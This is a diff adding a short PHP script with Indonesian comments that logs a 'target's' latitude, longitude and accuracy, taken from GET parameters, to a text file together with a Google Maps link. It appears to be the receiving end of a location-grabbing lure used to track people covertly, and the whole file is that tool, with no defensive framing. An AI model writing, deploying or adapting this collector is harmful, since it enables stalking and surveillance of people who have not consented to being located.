@@ -1,0 +1,18 @@
+<?php
+if (isset($_GET['lat']) && isset($_GET['lon'])) {
+    $lat = $_GET['lat'];
+    $lon = $_GET['lon'];
+    $acc = $_GET['acc'];
+
+    $data = "--- Data Lokasi Target ---\n";
+    $data .= "Waktu    : " . date('Y-m-d H:i:s') . "\n";
+    $data .= "Latitude : " . $lat . "\n";
+    $data .= "Longitude: " . $lon . "\n";
+    $data .= "Akurasi  : " . $acc . " meter\n";
+    $data .= "Google Maps: https://www.google.com/maps/place/" . $lat . "," . $lon . "\n\n";
+
+    // Menyimpan data ke file txt
+    file_put_contents("lokasi_target.txt", $data, FILE_APPEND);
+    echo "Sukses";
+}
+?>
